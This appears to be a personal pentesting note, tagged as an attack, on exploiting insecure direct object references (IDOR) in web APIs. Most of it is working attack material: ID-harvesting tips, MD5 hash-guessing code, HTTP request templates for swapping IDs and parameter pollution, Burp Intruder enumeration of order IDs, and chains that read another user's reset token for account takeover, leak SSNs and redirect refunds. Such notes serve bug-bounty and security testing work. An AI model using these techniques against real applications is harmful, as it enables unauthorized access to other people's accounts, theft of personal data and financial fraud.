---
tags: [bac, attack, idor, techniques, exploitation]
type: attack
severity: high
date: 2026-03-10
---

# ⚔️ IDOR Exploitation Techniques — Advanced

## Pre-Exploitation Recon

### 1. ID Harvesting Strategy
```
Sources to collect victim IDs from:
  ✓ Email notifications (order IDs, ticket IDs, invoice numbers)
  ✓ Shared URLs (public profile links, shareable docs)
  ✓ API responses (nested objects leaking other users' IDs)
  ✓ Webhook payloads
  ✓ Error messages (e.g., "Order 1338 belongs to another user")
  ✓ Browser history / Referer headers
  ✓ GraphQL responses (IDs in pagination, related objects)
  ✓ WebSocket messages
  ✓ Exported reports / CSV downloads
  ✓ RSS feeds / sitemap.xml
```

### 2. ID Pattern Analysis
```python
# Identify ID type from samples
samples = ["1001","1002","1005","1011"]  # Sequential integers
samples = ["ACC-2024-00123", "ACC-2024-00124"]  # Structured
samples = ["3f6a92b1-4c8d-4e2a-9d71-abc123def456"]  # UUIDs

# For hashed IDs - identify algorithm
import hashlib
target = "5f4dcc3b5aa765d61d8327deb882cf99"
for word in ["password","test","admin","user_1","invoice_1"]:
    if hashlib.md5(word.encode()).hexdigest() == target:
        print(f"Found: {word}")
```

---

## Exploitation Techniques

### Technique 1: Manual Swap
```http
# Baseline (your resource)
GET /api/messages/MY_MSG_ID
Authorization: Bearer YOUR_TOKEN

# Attack (victim's resource) 
GET /api/messages/VICTIM_MSG_ID
Authorization: Bearer YOUR_TOKEN
```

### Technique 2: Autorize (Burp Plugin)
```
1. Login as Victim → copy session cookie
2. Open Autorize → paste victim's cookie in "Autorize cookie" box
3. Enable Autorize
4. Browse app as Attacker
5. Autorize auto-replays each request with victim's cookie
6. Red = Bypassed (attacker cookie gets same 200 as victim)
7. Green = Enforced
8. Orange = Check manually
```

### Technique 3: Burp Intruder for IDOR Fuzzing
```
1. Capture: GET /api/order/§1001§
2. Intruder → Sniper attack
3. Payload: Numbers 1 to 10000
4. Filter: Status 200 AND length > 100 AND "error" not in response
5. Review results for cross-account data
```

### Technique 4: IDOR via HTTP Parameter Pollution
```http
# Single param - server uses second value
GET /api/profile?user=me&user=victim_id

# Array notation
GET /api/profile?user[]=me&user[]=victim_id

# Repeated params in body
POST /api/update
user_id=MY_ID&data=test&user_id=VICTIM_ID
```

### Technique 5: IDOR in Indirect References
```
Step 1: Find your own indirect ref
  GET /api/export → {"export_key": "export_a1b2c3"}

Step 2: Try to discover/guess other export keys
  GET /api/download/export_a1b2c4
  GET /api/download/export_a1b2c3   ← increment/decrement
  
Step 3: Check if export keys are leaked in other endpoints
  GET /api/notifications → {"message": "Your export export_a1b2c3 is ready"}
```

### Technique 6: IDOR via Response Manipulation
```
1. Request: GET /api/admin/dashboard → 403
2. Capture in Burp → send to Repeater
3. Change response: 403 → 200
4. Observe if admin content loads
5. NOTE: This is client-side bypass — server still enforces,
   but sometimes partial data is returned with 403
```

### Technique 7: IDOR Chaining (Compound Impact)
```
Chain 1: Information Disclosure → Account Takeover
  GET /api/user/1338/reset-token → {"token": "abc123"}
  POST /api/reset-password {"token": "abc123", "password": "hacked"}
  → Full account takeover!

Chain 2: IDOR → PII Leak → Identity Theft
  GET /api/user/1338/documents → returns SSN, DOB, address

Chain 3: IDOR → Financial Impact
  GET /api/invoice/1338 → payment info
  POST /api/refund {"invoice_id": "1338", "method": "to_my_account"}
```

---

## Post-Exploitation Evidence Collection

```http
# Document the IDOR with clean proof-of-concept:

Request 1 (Legitimate - Your Data):
GET /api/user/ATTACKER_ID/profile HTTP/1.1
Authorization: Bearer ATTACKER_TOKEN
→ Response shows ATTACKER's data

Request 2 (IDOR - Victim's Data):  
GET /api/user/VICTIM_ID/profile HTTP/1.1
Authorization: Bearer ATTACKER_TOKEN  ← ATTACKER's token!
→ Response shows VICTIM's data

# This clearly demonstrates:
# 1. Same auth token
# 2. Different resource ID
# 3. Different data returned (cross-account access)
```

---

## 🔗 Related Notes
- [[IDOR]]
- [[IDOR-Payloads]]
- [[Autorize-Plugin]]
- [[Burp-Suite-BAC]]
- [[Testing-Checklist]]

---
*Tags: #idor #attack #techniques #exploitation*
